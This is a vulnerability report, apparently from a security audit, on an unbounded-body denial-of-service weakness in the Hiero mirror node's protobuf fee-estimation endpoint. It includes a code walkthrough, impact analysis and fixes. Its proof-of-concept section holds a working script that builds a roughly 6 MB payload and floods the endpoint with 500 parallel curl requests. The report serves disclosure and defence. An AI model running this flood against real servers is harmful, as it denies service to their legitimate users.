### Title
Unbounded Protobuf Payload DoS via `estimateFees()` — No Body Size Limit or Rate Limiting

### Summary
The `POST /api/v1/network/fees` endpoint in `NetworkController.estimateFees()` accepts an unauthenticated raw `byte[]` body with no application-level size constraint, then passes it directly to `Transaction.PROTOBUF.parse()`. The rest-java module has no rate limiting for this endpoint. An attacker can repeatedly POST maximally-sized protobuf payloads to exhaust heap memory and CPU, degrading service for all concurrent users.

### Finding Description

**Exact code path:**

`rest-java/src/main/java/org/hiero/mirror/restjava/controller/NetworkController.java`, lines 110–124:

```java
@PostMapping(
        consumes = {"application/protobuf", "application/x-protobuf"},
        value = "/fees")
FeeEstimateResponse estimateFees(
        @RequestBody @NotNull byte[] body,          // ← no @Size constraint
        @RequestParam(defaultValue = "INTRINSIC", required = false) FeeEstimateMode mode,
        @RequestParam(name = HIGH_VOLUME_THROTTLE, defaultValue = "0", required = false) @Min(0) @Max(10000)
                int highVolumeThrottle) {
    try {
        final var transaction = Transaction.PROTOBUF.parse(Bytes.wrap(body)); // ← unbounded parse
        return toResponse(feeEstimationService.estimateFees(transaction, mode, highVolumeThrottle));
    } catch (ParseException e) {
        throw new IllegalArgumentException("Unable to parse transaction", e);
    }
}
```

**Root cause:** `@RequestBody @NotNull byte[] body` carries no `@Size(max=...)` annotation. Spring/Tomcat will buffer the entire request body into a heap `byte[]` before the method is invoked. `Transaction.PROTOBUF.parse(Bytes.wrap(body))` then performs full protobuf deserialization on that buffer. There is no pre-parse size gate.

**Why existing checks fail:**

1. **`@NotNull`** — only rejects a missing body; does not bound size.
2. **`@Min(0) @Max(10000)` on `highVolumeThrottle`** — validates a query parameter, irrelevant to body size.
3. **`JacksonConfiguration` stream-read constraints** (`maxDocumentLength=1000`, etc.) — apply exclusively to Jackson JSON deserialization. The protobuf endpoint bypasses Jackson entirely; `Transaction.PROTOBUF.parse()` is a PBJ runtime call, not a Jackson call.
4. **Web3 `ThrottleManagerImpl` / `ThrottleConfiguration`** — these live in the `web3` module and protect web3 endpoints only. There is no equivalent rate-limiting bean or filter in the `rest-java` module for `/api/v1/network/fees`.
5. **Tomcat `maxPostSize`** — Spring Boot's default 2 MB limit applies only to `application/x-www-form-urlencoded`. For `application/protobuf` content type, Tomcat imposes no default body-size ceiling; the body is read until the connection closes or a timeout fires.
6. **GCP gateway `maxRatePerEndpoint: 250`** — infrastructure-level, deployment-specific, not present in all environments, and 250 req/s with multi-MB payloads still represents substantial CPU/memory load.

### Impact Explanation

Each request causes: (a) full heap allocation of the raw byte array, (b) full PBJ protobuf deserialization traversal of the `Transaction` message tree. A sustained flood of large payloads (e.g., 1–10 MB each) from a single attacker IP can saturate the Tomcat thread pool and JVM heap, causing GC pressure and increased latency or OOM for all concurrent legitimate users of the mirror node REST Java API. No economic stake or privileged credential is required.

### Likelihood Explanation

The endpoint is publicly reachable with no authentication. The only required precondition is knowledge of the `application/protobuf` content type (visible in the OpenAPI spec or by inspection). A single machine with a moderate network connection can sustain hundreds of large POST requests per second. The attack is trivially scriptable with `curl` or any HTTP client.

### Recommendation

1. **Enforce a body size limit at the application layer** — add `@Size(max = MAX_TX_BYTES)` to the `body` parameter (where `MAX_TX_BYTES` matches the Hedera network's maximum transaction size, currently 6 KB) or configure a `CommonsRequestLoggingFilter` / custom `OncePerRequestFilter` that rejects requests exceeding the limit before body buffering completes.
2. **Add rate limiting to the rest-java module** — mirror the `ThrottleConfiguration`/`ThrottleManagerImpl` pattern from the `web3` module, or add a Bucket4j-based filter scoped to `POST /api/v1/network/fees`.
3. **Configure Tomcat's connector `maxPostSize`** for non-form content types via `server.tomcat.max-http-form-post-size` and supplement with a servlet filter that checks `Content-Length` before reading the body.

### Proof of Concept

```bash
# Generate a maximally-sized valid-looking protobuf blob (~6 MB of padding)
python3 -c "
import struct
# Field 1 (signedTransactionBytes, wire type 2 = length-delimited)
data = b'\x0a' + b'\xff\xff\xff\x02' + b'\x00' * (6 * 1024 * 1024)
open('/tmp/fat.pb', 'wb').write(data)
"

# Flood the endpoint (no credentials required)
for i in $(seq 1 500); do
  curl -s -o /dev/null \
    -X POST https://<mirror-node-host>/api/v1/network/fees \
    -H "Content-Type: application/protobuf" \
    --data-binary @/tmp/fat.pb &
done
wait
```

Observe: JVM heap usage climbs, GC pauses increase, and response latency for all `/api/v1/network/*` endpoints degrades. No authentication token or privileged account is needed. [1](#0-0) [2](#0-1)

### Citations

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/controller/NetworkController.java (L110-124)
```java
    @PostMapping(
            consumes = {"application/protobuf", "application/x-protobuf"},
            value = "/fees")
    FeeEstimateResponse estimateFees(
            @RequestBody @NotNull byte[] body,
            @RequestParam(defaultValue = "INTRINSIC", required = false) FeeEstimateMode mode,
            @RequestParam(name = HIGH_VOLUME_THROTTLE, defaultValue = "0", required = false) @Min(0) @Max(10000)
                    int highVolumeThrottle) {
        try {
            final var transaction = Transaction.PROTOBUF.parse(Bytes.wrap(body));
            return toResponse(feeEstimationService.estimateFees(transaction, mode, highVolumeThrottle));
        } catch (ParseException e) {
            throw new IllegalArgumentException("Unable to parse transaction", e);
        }
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/config/JacksonConfiguration.java (L16-35)
```java
    @Bean
    @SuppressWarnings("removal")
    Jackson2ObjectMapperBuilderCustomizer jacksonCustomizer() {
        return builder -> {
            var streamReadConstraints = StreamReadConstraints.builder()
                    .maxDocumentLength(1000)
                    .maxNameLength(100)
                    .maxNestingDepth(10)
                    .maxNumberLength(19)
                    .maxStringLength(1000)
                    .maxTokenCount(100)
                    .build();
            var streamWriteConstraints =
                    StreamWriteConstraints.builder().maxNestingDepth(100).build();
            var factory = new MappingJsonFactory();
            factory.setStreamReadConstraints(streamReadConstraints);
            factory.setStreamWriteConstraints(streamWriteConstraints);
            builder.factory(factory);
        };
    }
```
